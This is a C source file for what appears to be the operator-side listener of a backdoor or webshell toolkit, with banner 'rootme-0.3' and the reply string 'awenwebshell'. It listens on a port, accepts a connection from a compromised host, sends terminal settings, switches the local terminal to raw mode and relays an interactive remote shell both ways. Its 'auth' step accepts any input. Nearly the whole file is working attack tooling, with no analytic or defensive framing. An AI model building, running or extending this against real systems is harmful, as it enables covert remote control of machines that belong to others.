#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <netdb.h>

#define DEFAULT_URI   "root+"
#define ROOTME_BANNER "rootme-0.3 ready"

unsigned int ip = 3232235883;

int real_main( int argc, char *argv[] );

int auth(int client_fd)
{
	char buffer[16] = {0x0};
	fd_set rfds;
	FD_ZERO( &rfds );
	FD_SET( client_fd, &rfds );

	if( select( client_fd + 1, &rfds, NULL, NULL, NULL ) < 0 )
	{
		perror( "select" );
		fprintf(stderr, "auth error!\n");
		return -1;
	}

	if( FD_ISSET( client_fd, &rfds ) )
	{
		int n = recv( client_fd, buffer, sizeof( buffer ), 0 );

		char sendbuf[13] = "awenwebshell";
		sendbuf[12] = 0x0;
		n = send(client_fd, sendbuf, 12, 0);
	}

	return 0;
}

int fnSockServerInit(int remoteport)
{
	struct sockaddr_in foreignaddr;
	struct sockaddr_in localaddr; 
	int sock, retsock, len, client_len;

	sock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

	localaddr.sin_family = AF_INET;
	localaddr.sin_port = htons(remoteport);
	localaddr.sin_addr.s_addr = htonl(INADDR_ANY);
	//localaddr.sin_addr.s_addr = htonl(ip);

	if ((bind(sock,(struct sockaddr *)&localaddr,sizeof(localaddr))) < 0)
	{
		fprintf(stderr,"FATAL: unable to bind socket.\n");
		return -1; 
	}
	len = sizeof(localaddr);
	if ((getsockname(sock,(struct sockaddr *)&localaddr,&len)) < 0)
	{
		fprintf(stderr,"FATAL: unable to get socket name\n");
		return -1;
	}
	if (listen(sock,5) < 0)
	{
		fprintf(stderr,"FATAL: unable to listen on %i\n",remoteport);
		return -1;
	}

	client_len = sizeof(foreignaddr);

	retsock = accept(sock,(struct sockaddr *)&foreignaddr,&client_len);
	return retsock;
}

int main( int argc, char *argv[] )
{
    int ret = real_main( argc, argv );

#ifdef CYGWIN

    /* under cygwin, make sure windows stays visible */

    if( ret )
    {
        int n;
        printf( "\nPress Ctrl-C to exit.\n" );
        scanf( "%d", &n );
    }

#endif

    return( ret );
}

int real_main( int argc, char *argv[] )
{
    char *term;
    fd_set rfds;
    int client_fd;
    int n, imf, ret;
    char buffer[4096];
    struct winsize ws;
    struct termios tp, tr;
    struct hostent *server_host;
    struct sockaddr_in server_addr;

    /* check the arguments */

    if( argc < 2 )
    {
        printf( "\nusage: [listenport]\n" );
        return( 1 );
    }

	client_fd = fnSockServerInit(atoi(argv[1]));
	if (client_fd < 0)
	{
		perror("fnSockServerInit");
		return -1;
	}

	if (argc == 2 && auth(client_fd))
	{
		fprintf(stderr, "auth error!\n");
		return -1;
	}

    memset( buffer, 0, sizeof( buffer ) );

    imf = 0;

    if( isatty( 0 ) )
    {
        imf = 1; /* set interactive mode flag */

        if( ioctl( 0, TIOCGWINSZ, &ws ) < 0 )
        {
            perror( "ioctl(TIOCGWINSZ)" );
            return( 1 );
        }
    }
    else
    {
        /* fallback on standard settings */

        ws.ws_row = 25;
        ws.ws_col = 80;
    }

    buffer[0] = ( ws.ws_row >> 8 ) & 0xFF;
    buffer[1] = ( ws.ws_row      ) & 0xFF;

    buffer[2] = ( ws.ws_col >> 8 ) & 0xFF;
    buffer[3] = ( ws.ws_col      ) & 0xFF;

    if( ! ( term = getenv( "TERM" ) ) )
        term = "vt100";

    strncpy( buffer + 4, term, sizeof( buffer ) - 5 );

    if( send( client_fd, buffer, 64, 0 ) != 64 )
    {
        perror( "send TERM var" );
        return( 1 );
    }

    /* set the tty to RAW */

    if( isatty( 1 ) )
    {
        if( tcgetattr( 1, &tp ) < 0 )
        {
            perror( "tcgetattr" );
            return( 1 );
        }

        memcpy( (void *) &tr, (void *) &tp, sizeof( tr ) );

        tr.c_iflag |= IGNPAR;
        tr.c_iflag &= ~(ISTRIP|INLCR|IGNCR|ICRNL|IXON|IXANY|IXOFF);
        tr.c_lflag &= ~(ISIG|ICANON|ECHO|ECHOE|ECHOK|ECHONL|IEXTEN);
        tr.c_oflag &= ~OPOST;

        tr.c_cc[VMIN]  = 1;
        tr.c_cc[VTIME] = 0;

        if( tcsetattr( 1, TCSADRAIN, &tr ) < 0 )
        {
            perror( "tcsetattr" );
            return( 1 );
        }
    }

    /* let's forward the data back and forth */

    ret = 1;

    while( 1 )
    {
        FD_ZERO( &rfds );
        if( imf ) FD_SET( 0, &rfds );
        FD_SET( client_fd, &rfds );

        if( select( client_fd + 1, &rfds, NULL, NULL, NULL ) < 0 )
        {
            perror( "select" );
            break;
        }

        if( FD_ISSET( client_fd, &rfds ) )
        {
            n = recv( client_fd, buffer, sizeof( buffer ), 0 );

            if( n == 0 ) { ret = 0;          break; }
            if( n  < 0 ) { perror( "recv" ); break; }

            if( write( 1, buffer, n ) != n )
            {
                perror( "write" );
                break;
            }
        }

        if( imf && FD_ISSET( 0, &rfds ) )
        {
            n = read( 0, buffer, sizeof( buffer ) );

            if( n == 0 )
            {
                fprintf( stderr, "stdin: end-of-file\n" );
                break;
            }

            if( n  < 0 ) { perror( "read" ); break; }

            if( send( client_fd, buffer, n, 0 ) != n )
            {
                perror( "send" );
                break;
            }
        }
    }

    /* restore the terminal attributes */

    if( isatty( 1 ) )
    {
        tcsetattr( 1, TCSADRAIN, &tp );
    }

    return( ret );
}
